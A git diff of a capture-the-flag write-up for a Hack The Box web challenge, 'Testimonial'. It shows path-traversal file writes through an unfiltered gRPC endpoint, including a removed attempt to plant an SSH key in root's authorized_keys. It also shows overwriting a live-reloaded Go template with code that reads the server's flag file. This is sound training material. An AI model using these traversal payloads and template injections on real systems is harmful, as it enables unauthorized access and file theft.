@@ -21,6 +21,12 @@
     - [XSS](#xss)
     - [Templating Injection](#templating-injection)
   - [Protocol Buffers](#protocol-buffers)
+    - [Compiling The Protocol Buffers For Python](#compiling-the-protocol-buffers-for-python)
+    - [File Write PoC](#file-write-poc)
+  - [`Air` - Live Reload For Go Apps](#air---live-reload-for-go-apps)
+  - [Local PoC](#local-poc)
+    - [Building The Docker Image](#building-the-docker-image)
+  - [Remote PoC \& Flag](#remote-poc--flag)
 
 
 ## Files
@@ -77,7 +83,7 @@ Archive:  web_testimonial.zip
 
 Ther first endpoint is a web page.
 
-![alt text](image.png)
+![alt text](images/image.png)
 
 The web site lists some testimonials and allows us to write one of our own.
 
@@ -101,11 +107,11 @@ Our second endpoint is probably a gRPC service.
 
 ## Poking Around The Website
 
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 
 We are able to post a testimonial.
 
-![alt text](image-4.png)
+![alt text](images/image-4.png)
 
 We can also browse the `public` directory.
 
@@ -114,9 +120,10 @@ We can also browse the `public` directory.
 
 I don't think `XXS` is the right attack vector here, but let's just try it anyway:
 
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 
-No apparent `XXS` vulnerability here.
+No apparent `XXS` vulnerability here. Even if we can bypass the filter, we don't have a way to execute the payload as another user.
+
 
 ### Templating Injection
 
@@ -131,7 +138,7 @@ From [index.templ](challenge/view/home/index.templ):
   </section>
 ```
 
-![alt text](image-3.png)
+![alt text](images/image-3.png)
 
 Not an obvious `Templating Injection` vulnerability either.
 
@@ -141,49 +148,42 @@ Not an obvious `Templating Injection` vulnerability either.
 Maybe we can find something in the protocol buffers?
 
 
+### Compiling The Protocol Buffers For Python
+
 ```bash
 $ python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. challenge/pb/ptypes.proto
 ```
 
+Creates the following files:
+
+- [`ptypes_pb2.py`](challenge/pb/ptypes_pb2.py)
+- [`ptypes_pb2_grpc.py`](challenge/pb/ptypes_pb2_grpc.py)
+
+
+### File Write PoC
+
+My `rpc.py` script takes two arguments: `filename` and `content`. It connects to the gRPC service and sends a testimonial with the given `filename` and `content`.
 
 ```bash
-$ python3 rpc.py "../../../../../../../root/.ssh/authorized_keys" "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA9BplI+X2/T/b3JMjn2TYaPbhcQkl9oETcoHRsvsk13Pm3pBdrqz3fs2eNslCjYUzuVpQSZJA056Y+3ouW405Zw9UjaUmQsWwFnnH4HSXd1Z7kwfggWU3yruuTuMLyVuEWhfqovKpiki5hcoPHVRKu4WYEgqfy3phffSOf89XXw6ivfCp7sppFlnHn6XMUo+1tjkl2Z1V3uIns4OFkdC33Dqz+/vpYFZIScy7J/EgPcgnVdPKt9qOxyFIm5tzjsTxuUjtWZ9eq4oq3EB73qs5Zbl82oXi6XyHN1Oq03jV9bqw8gDCL0WtzVKd1lSM8O1IB+UToGziZVibU3oK2zKIdw=="
-Traceback (most recent call last):
-  File "/mnt/c/Dev/ctf-htb-cyber-apocalypse-2024/web/testimonial/challenge/pb/rpc.py", line 20, in <module>
-    response = stub.SubmitTestimonial(request)
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/hag/.local/lib/python3.11/site-packages/grpc/_channel.py", line 1176, in __call__
-    return _end_unary_response_blocking(state, call, False, None)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/hag/.local/lib/python3.11/site-packages/grpc/_channel.py", line 1005, in _end_unary_response_blocking
-    raise _InactiveRpcError(state)  # pytype: disable=not-instantiable
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
-        status = StatusCode.UNKNOWN
-        details = "open public/testimonials/../../../../../../../root/.ssh/authorized_keys: no such file or directory"
-        debug_error_string = "UNKNOWN:Error received from peer  {grpc_message:"open public/testimonials/../../../../../../../root/.ssh/authorized_keys: no such file or directory", grpc_status:2, created_time:"2024-03-13T10:38:40.643544418+01:00"}"
+python3 rpc.py "../../../../1.txt.txt" "PPPPPPPPPPPPPPPPPPPPPPPPP"
 ```
 
+By running the challenge in a local docker container, we can see that the file `1.txt.txt` has been created.
 
-```
-$ python3 rpc.py "../../../../1.txt.txt" "PPPPPPPPPPPPPPPPPPPPPPPPP"
-
-
-
+```bash
 / # ls -al
 total 96
 drwxr-xr-x    1 root     root          4096 Mar 13 13:04 .
 drwxr-xr-x    1 root     root          4096 Mar 13 13:04 ..
 -rwxr-xr-x    1 root     root             0 Mar 13 11:44 .dockerenv
 -rw-r--r--    1 root     root            25 Mar 13 13:04 1.txt.txt
+```
 
+This is very interesting. We can write files to the server. This works because the filtering is done in the `client.go`, but not when using the `gRPC` service directly.
 
+From [`challenge/client/client.go`](challenge/client/client.go):
 
-
-
-
-
-
+```go
 func (c *Client) SendTestimonial(customer, testimonial string) error {
 	ctx := context.Background()
 	// Filter bad characters.
@@ -195,3 +195,208 @@ func (c *Client) SendTestimonial(customer, testimonial string) error {
 	return err
 }
 ```
+
+How can we use this to our advantage?
+
+
+## `Air` - Live Reload For Go Apps
+
+From `Dockerfile`:
+
+```Dockerfile
+RUN go mod download -x \
+ && go install github.com/cosmtrek/air@latest \
+ && go install github.com/a-h/templ/cmd/templ@latest
+```
+
+From `entrypoint.sh`:
+
+```bash
+# Start application
+air
+```
+
+We can see that the website is hosted through `Air`, which is a live reload tool for Go applications. It watches for file changes and automatically restarts the server. `Air` should not be used in production, but it's very useful for development.
+
+[https://github.com/cosmtrek/air](https://github.com/cosmtrek/air)
+
+![Alt text](images/air.png)
+
+It's possible that we can use this to our advantage. We can write a file to the server, and then wait for `Air` to restart the server. When the server restarts, it will read the file we wrote to the server.
+
+
+## Local PoC
+
+### Building The Docker Image
+
+```bash
+$ ./build-docker.sh
+Error response from daemon: No such container: web_testimonial
+[+] Building 19.9s (12/12) FINISHED
+
+# ...abbreviated
+
+  __    _   ___
+ / /\  | | | |_)
+/_/--\ |_| |_| \_ v1.51.0, built with Go go1.22.1
+
+watching .
+watching client
+watching handler
+watching pb
+watching pb/__pycache__
+watching public
+watching public/css
+watching public/js
+watching public/testimonials
+!exclude tmp
+watching view
+watching view/home
+watching view/layout
+building...
+(!) templ version check: generator v0.2.639 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
+(✓) Complete [ updates=2 duration=1.386781ms ]
+running...
+```
+
+We can see that `Air` is watching some directories and the server is running.
+
+![Alt text](images/image-7.png)
+
+We can now run the `rpc.py` script to write a file to the server. I've modified the script to take in a file name as the second argument so we can easily upload a complete file.
+
+We know the folder structure on the server from the `Dockerfile`:
+
+```Dockerfile
+WORKDIR /challenge/
+COPY ./challenge/ /challenge/
+```
+
+Let's try to modify the `app.templ` file.
+
+From [`app-modified-title.templ`](app-modified-title.templ):
+
+```html
+<!-- ...abbreviated -->
+<title>!!!!!</title>
+<!-- ...abbreviated -->
+```
+
+We have changed the title of the page to `!!!!!` as a proof of concept.
+
+Let's upload our modified version. The full path on the server should be; `/challenge/view/layout/app.templ`.
+
+```bash
+$ python3 rpc.py ../../../../../../challenge/view/layout/app.templ ../../app-modified-titl
+e.templ
+Testimonial submitted successfully
+```
+
+We can see that the file change has been detected by `Air`:
+
+![Alt text](images/image-8.png)
+
+```
+running...
+view/layout/app.templ has changed
+building...
+(!) templ version check: generator v0.2.639 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
+(✓) Complete [ updates=2 duration=2.032748ms ]
+running...
+```
+
+We can also see that the title of the page has been changed:
+
+![Alt text](images/image-9.png)
+
+Now we can try to write a file to the server that will give us the flag.
+
+From [`app-modified-flag.templ`](app-modified-flag.templ):
+
+```
+templ App(nav bool) {
+	<!DOCTYPE html>
+	<html lang="en">
+		<head>
+			<title>!!!!!</title>
+			<meta charset="UTF-8"/>
+			<link rel="stylesheet" href="/public/css/main.css"/>
+			<link rel="stylesheet" href="/public/css/bootstrap.min.css"/>
+			<script type="text/plain" src="/public/bootstrap.min.js"></script>
+		</head>
+		{ children... }
+
+		{ findAndReadFlagFile() }
+	</html>
+}
+
+
+func findAndReadFlagFile() (string, error) {
+	files, err := ioutil.ReadDir("/")
+	if err != nil {
+		return "", err
+	}
+
+	flagFilePattern := regexp.MustCompile(`^flag[a-fA-F0-9]+\.txt$`)
+	for _, file := range files {
+		if flagFilePattern.MatchString(file.Name()) {
+			content, err := ioutil.ReadFile(fmt.Sprintf("%s/%s", "/", file.Name()))
+			if err != nil {
+				return "", err
+			}
+			return string(content), nil
+		}
+	}
+
+	return "", errors.New("No matching flag file found")
+}
+```
+
+The `findAndReadFlagFile` method will read the contents of the first file that matches the pattern `flag[a-fA-F0-9]+\.txt$` in the root directory.
+
+Adding `{ findAndReadFlagFile() }` in `templ App(nav bool)` makes sure to add the content of the flag file to the page.
+
+Let's upload the file:
+
+```bash
+$ python3 rpc.py ../../../../../../challenge/view/layout/app.templ ../../app-modified-flag.templ
+Testimonial submitted successfully
+```
+
+We can see that the file change has been detected by `Air` again:
+
+```
+building...
+(!) templ version check: generator v0.2.639 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
+(✓) Complete [ updates=2 duration=1.386781ms ]
+running...
+view/layout/app.templ has changed
+building...
+(!) templ version check: generator v0.2.639 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
+(✓) Complete [ updates=2 duration=2.032748ms ]
+running...
+view/layout/app.templ has changed
+building...
+(!) templ version check: generator v0.2.639 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
+(✓) Complete [ updates=2 duration=1.943531ms ]
+running...
+```
+
+Let's refresh the page:
+
+![Alt text](images/image-10.png)
+
+We can see the local fake flag! 🚩🥳
+
+
+## Remote PoC & Flag
+
+Let's try our PoC on the remote server.
+
+![Alt text](images/image-5.png)
+
+```
+HTB{w34kly_t35t3d_t3mplate5}
+```
+
+Success! 🚩🥳
